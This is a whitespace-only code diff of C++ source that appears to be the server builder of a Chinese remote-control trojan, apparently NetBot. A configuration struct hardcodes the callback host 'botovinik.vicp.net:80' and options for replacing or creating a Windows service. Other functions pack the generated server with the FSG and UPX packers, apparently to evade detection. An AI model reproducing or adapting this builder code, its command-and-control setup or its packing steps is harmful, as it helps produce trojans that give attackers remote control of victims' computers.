@@ -13,7 +13,7 @@ static char THIS_FILE[] = __FILE__;
 
 struct MODIFY_DATA
 {
-    char  strIPFile[128];   //ip文件or DNS						0
+	char  strIPFile[128];   //ip文件or DNS						0
 	char  strVersion[16];   //服务端版本						128
 	DWORD dwVipID;          //VIP ID							144
 	BOOL  bReplace;         //TRUE-替换服务，FALSE-新建服务		148
@@ -24,7 +24,7 @@ struct MODIFY_DATA
 	int   ServerPort;		//Client port						481
 }modify_data =
 {
-    "botovinik.vicp.net:80",
+	"botovinik.vicp.net:80",
 	"150628",
 	vipid,
 	FALSE,
@@ -78,7 +78,7 @@ END_MESSAGE_MAP()
 void CServerDlg::ReadIniFile()
 {
 	char Path[255];
-    GetCurrentDirectory(255, Path);
+	GetCurrentDirectory(255, Path);
 	CString path;
 	path.Format("%s\\NetBot.ini", Path);
 	if(m_Ini.SetPath(path))
@@ -99,10 +99,10 @@ void CServerDlg::OnCompressType(UINT nID)
 		break;
 	case IDC_RADIO3:
 		CompressType = 3;
-	    break;
+		break;
 	default:
 		CompressType = 3;
-	    break;
+		break;
 	}
 }
 
@@ -219,8 +219,8 @@ int ResToFile(char Path[], DWORD id)
 
 int CServerDlg::Compress(char File[], DWORD id)
 {
-    char PackerPath[256];
-    GetCurrentDirectory(256, PackerPath);
+	char PackerPath[256];
+	GetCurrentDirectory(256, PackerPath);
 	lstrcat(PackerPath, File);
 	DeleteFile(PackerPath);
 	
@@ -237,12 +237,12 @@ int CServerDlg::Compress(char File[], DWORD id)
 
 void CServerDlg::CompressFsg()
 {
-    Compress("\\fsg.exe", IDR_FSG);
+	Compress("\\fsg.exe", IDR_FSG);
 }
 
 void CServerDlg::CompressUpx()
 {
-    Compress("\\upx.exe", IDR_UPX);
+	Compress("\\upx.exe", IDR_UPX);
 }
 
 //////////////////////////////////////////////////////////////////////////////////////////////
